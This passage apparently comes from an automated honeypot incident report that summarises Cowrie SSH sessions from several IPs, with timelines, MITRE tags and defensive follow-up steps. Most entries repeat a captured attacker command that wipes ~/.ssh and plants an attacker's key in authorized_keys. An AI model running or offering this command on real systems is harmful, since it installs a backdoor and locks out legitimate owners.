| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:55:45` | `cowrie.session.connect` |
| `2026-06-06 15:55:45` | `cowrie.client.version` |
| `2026-06-06 15:55:45` | `cowrie.client.kex` |
| `2026-06-06 15:55:46` | `cowrie.login.success` |
| `2026-06-06 15:55:46` | `cowrie.session.params` |
| `2026-06-06 15:55:46` | `cowrie.command.input` |
| `2026-06-06 15:55:46` | `cowrie.command.failed` |
| `2026-06-06 15:55:47` | `cowrie.log.closed` |
| `2026-06-06 15:55:47` | `cowrie.session.params` |
| `2026-06-06 15:55:47` | `cowrie.command.input` |
| `2026-06-06 15:55:47` | `cowrie.session.file_download` |
| `2026-06-06 15:55:47` | `cowrie.log.closed` |
| `2026-06-06 15:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35a05365aa0

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:55 |
| **Last Seen** | 2026-06-06 15:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:55:49` | `cowrie.session.connect` |
| `2026-06-06 15:55:49` | `cowrie.client.version` |
| `2026-06-06 15:55:49` | `cowrie.client.kex` |
| `2026-06-06 15:55:50` | `cowrie.login.success` |
| `2026-06-06 15:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0562528d355f

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:57 |
| **Last Seen** | 2026-06-06 15:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:57:52` | `cowrie.session.connect` |
| `2026-06-06 15:57:52` | `cowrie.client.version` |
| `2026-06-06 15:57:52` | `cowrie.client.kex` |
| `2026-06-06 15:57:53` | `cowrie.login.success` |
| `2026-06-06 15:57:53` | `cowrie.session.params` |
| `2026-06-06 15:57:53` | `cowrie.command.input` |
| `2026-06-06 15:57:53` | `cowrie.command.failed` |
| `2026-06-06 15:57:53` | `cowrie.log.closed` |
| `2026-06-06 15:57:53` | `cowrie.session.params` |
| `2026-06-06 15:57:53` | `cowrie.command.input` |
| `2026-06-06 15:57:54` | `cowrie.session.file_download` |
| `2026-06-06 15:57:54` | `cowrie.log.closed` |
| `2026-06-06 15:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee361e2b441

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:57 |
| **Last Seen** | 2026-06-06 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:57:56` | `cowrie.session.connect` |
| `2026-06-06 15:57:56` | `cowrie.client.version` |
| `2026-06-06 15:57:56` | `cowrie.client.kex` |
| `2026-06-06 15:57:57` | `cowrie.login.success` |
| `2026-06-06 15:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896699a2acf9

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:59 |
| **Last Seen** | 2026-06-06 15:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:59:18` | `cowrie.session.connect` |
| `2026-06-06 15:59:18` | `cowrie.client.version` |
| `2026-06-06 15:59:19` | `cowrie.client.kex` |
| `2026-06-06 15:59:19` | `cowrie.login.success` |
| `2026-06-06 15:59:19` | `cowrie.session.params` |
| `2026-06-06 15:59:19` | `cowrie.command.input` |
| `2026-06-06 15:59:19` | `cowrie.command.failed` |
| `2026-06-06 15:59:19` | `cowrie.log.closed` |
| `2026-06-06 15:59:20` | `cowrie.session.params` |
| `2026-06-06 15:59:20` | `cowrie.command.input` |
| `2026-06-06 15:59:20` | `cowrie.session.file_download` |
| `2026-06-06 15:59:20` | `cowrie.log.closed` |
| `2026-06-06 15:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e1580049832

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:59 |
| **Last Seen** | 2026-06-06 15:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:59:22` | `cowrie.session.connect` |
| `2026-06-06 15:59:22` | `cowrie.client.version` |
| `2026-06-06 15:59:22` | `cowrie.client.kex` |
| `2026-06-06 15:59:22` | `cowrie.login.success` |
| `2026-06-06 15:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ac7e80f19a

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:01 |
| **Last Seen** | 2026-06-06 16:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:01:34` | `cowrie.session.connect` |
| `2026-06-06 16:01:34` | `cowrie.client.version` |
| `2026-06-06 16:01:34` | `cowrie.client.kex` |
| `2026-06-06 16:01:36` | `cowrie.login.success` |
| `2026-06-06 16:01:37` | `cowrie.session.params` |
| `2026-06-06 16:01:37` | `cowrie.command.input` |
| `2026-06-06 16:01:37` | `cowrie.command.failed` |
| `2026-06-06 16:01:37` | `cowrie.log.closed` |
| `2026-06-06 16:01:38` | `cowrie.session.params` |
| `2026-06-06 16:01:38` | `cowrie.command.input` |
| `2026-06-06 16:01:38` | `cowrie.session.file_download` |
| `2026-06-06 16:01:38` | `cowrie.log.closed` |
| `2026-06-06 16:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad852da7bc0c

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:01 |
| **Last Seen** | 2026-06-06 16:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:01:42` | `cowrie.session.connect` |
| `2026-06-06 16:01:42` | `cowrie.client.version` |
| `2026-06-06 16:01:42` | `cowrie.client.kex` |
| `2026-06-06 16:01:43` | `cowrie.login.success` |
| `2026-06-06 16:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f84380923c07

| Field | Detail |
|---|---|
| **Source IP** | `147.45.48[.]17` |
| **First Seen** | 2026-06-06 16:02 |
| **Last Seen** | 2026-06-06 16:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:02:53` | `cowrie.session.connect` |
| `2026-06-06 16:02:53` | `cowrie.client.version` |
| `2026-06-06 16:02:54` | `cowrie.client.kex` |
| `2026-06-06 16:02:55` | `cowrie.login.success` |
| `2026-06-06 16:02:56` | `cowrie.session.params` |
| `2026-06-06 16:02:56` | `cowrie.command.input` |
| `2026-06-06 16:02:56` | `cowrie.command.failed` |
| `2026-06-06 16:02:56` | `cowrie.log.closed` |
| `2026-06-06 16:02:57` | `cowrie.session.params` |
| `2026-06-06 16:02:57` | `cowrie.command.input` |
| `2026-06-06 16:02:57` | `cowrie.session.file_download` |
| `2026-06-06 16:02:57` | `cowrie.log.closed` |
| `2026-06-06 16:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.48[.]17` to AbuseIPDB if not already reported
- [ ] Block `147.45.48[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f48e02a07c

| Field | Detail |
|---|---|
| **Source IP** | `147.45.48[.]17` |
| **First Seen** | 2026-06-06 16:03 |
| **Last Seen** | 2026-06-06 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:03:00` | `cowrie.session.connect` |
| `2026-06-06 16:03:00` | `cowrie.client.version` |
| `2026-06-06 16:03:00` | `cowrie.client.kex` |
| `2026-06-06 16:03:01` | `cowrie.login.success` |
| `2026-06-06 16:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.48[.]17` to AbuseIPDB if not already reported
- [ ] Block `147.45.48[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e055630439

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 16:03 |
| **Last Seen** | 2026-06-06 16:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:03:31` | `cowrie.session.connect` |
| `2026-06-06 16:03:31` | `cowrie.client.version` |
| `2026-06-06 16:03:31` | `cowrie.client.kex` |
| `2026-06-06 16:03:32` | `cowrie.login.success` |
| `2026-06-06 16:03:32` | `cowrie.session.params` |
| `2026-06-06 16:03:32` | `cowrie.command.input` |
| `2026-06-06 16:03:32` | `cowrie.command.failed` |
| `2026-06-06 16:03:32` | `cowrie.log.closed` |
| `2026-06-06 16:03:32` | `cowrie.session.params` |
| `2026-06-06 16:03:32` | `cowrie.command.input` |
| `2026-06-06 16:03:32` | `cowrie.session.file_download` |
| `2026-06-06 16:03:32` | `cowrie.log.closed` |
| `2026-06-06 16:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0df7a6665b02

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 16:03 |
| **Last Seen** | 2026-06-06 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:03:34` | `cowrie.session.connect` |
| `2026-06-06 16:03:34` | `cowrie.client.version` |
| `2026-06-06 16:03:34` | `cowrie.client.kex` |
| `2026-06-06 16:03:35` | `cowrie.login.success` |
| `2026-06-06 16:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef747d2a6b8b

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 16:08 |
| **Last Seen** | 2026-06-06 16:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:08:54` | `cowrie.session.connect` |
| `2026-06-06 16:08:54` | `cowrie.client.version` |
| `2026-06-06 16:08:55` | `cowrie.client.kex` |
| `2026-06-06 16:08:55` | `cowrie.login.success` |
| `2026-06-06 16:08:56` | `cowrie.session.params` |
| `2026-06-06 16:08:56` | `cowrie.command.input` |
| `2026-06-06 16:08:56` | `cowrie.command.failed` |
| `2026-06-06 16:08:56` | `cowrie.log.closed` |
| `2026-06-06 16:08:56` | `cowrie.session.params` |
| `2026-06-06 16:08:56` | `cowrie.command.input` |
| `2026-06-06 16:08:56` | `cowrie.session.file_download` |
| `2026-06-06 16:08:56` | `cowrie.log.closed` |
| `2026-06-06 16:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc75a22299b8

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 16:08 |
| **Last Seen** | 2026-06-06 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:08:58` | `cowrie.session.connect` |
| `2026-06-06 16:08:58` | `cowrie.client.version` |
| `2026-06-06 16:08:59` | `cowrie.client.kex` |
| `2026-06-06 16:08:59` | `cowrie.login.success` |
| `2026-06-06 16:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e84302f88784

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 16:11 |
| **Last Seen** | 2026-06-06 16:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:11:04` | `cowrie.session.connect` |
| `2026-06-06 16:11:04` | `cowrie.client.version` |
| `2026-06-06 16:11:04` | `cowrie.client.kex` |
| `2026-06-06 16:11:04` | `cowrie.login.success` |
| `2026-06-06 16:11:05` | `cowrie.session.params` |
| `2026-06-06 16:11:05` | `cowrie.command.input` |
| `2026-06-06 16:11:05` | `cowrie.command.failed` |
| `2026-06-06 16:11:05` | `cowrie.log.closed` |
| `2026-06-06 16:11:05` | `cowrie.session.params` |
| `2026-06-06 16:11:05` | `cowrie.command.input` |
| `2026-06-06 16:11:06` | `cowrie.session.file_download` |
| `2026-06-06 16:11:06` | `cowrie.log.closed` |
| `2026-06-06 16:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda7767a4667

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 16:11 |
| **Last Seen** | 2026-06-06 16:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:11:08` | `cowrie.session.connect` |
| `2026-06-06 16:11:08` | `cowrie.client.version` |
| `2026-06-06 16:11:08` | `cowrie.client.kex` |
| `2026-06-06 16:11:09` | `cowrie.login.success` |
| `2026-06-06 16:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80db9d2eaec

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 16:11 |
| **Last Seen** | 2026-06-06 16:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:11:55` | `cowrie.session.connect` |
| `2026-06-06 16:11:55` | `cowrie.client.version` |
| `2026-06-06 16:11:55` | `cowrie.client.kex` |
| `2026-06-06 16:11:55` | `cowrie.login.success` |
| `2026-06-06 16:11:55` | `cowrie.session.params` |
| `2026-06-06 16:11:55` | `cowrie.command.input` |
